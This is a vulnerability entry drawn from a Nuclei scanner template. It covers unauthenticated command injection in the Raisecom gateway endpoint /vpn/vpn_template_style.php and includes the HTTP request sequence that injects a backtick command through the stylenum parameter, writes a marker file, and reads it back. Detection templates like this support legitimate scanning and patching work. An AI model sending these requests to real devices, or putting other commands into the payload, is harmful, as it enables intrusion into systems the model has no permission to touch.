# Vulnerability: Raisecom Gateway vpn_template_style.php - Remote Command Execution
**Classification:** RAISECOM
**Source:** Nuclei Template (`raisecom-rce.yaml`)

## Description
The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\) or pipe (|`) characters.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
Host: {{Hostname}}

GET /tmp/{{filename}}.txt HTTP/1.1
Host: {{Hostname}}
```

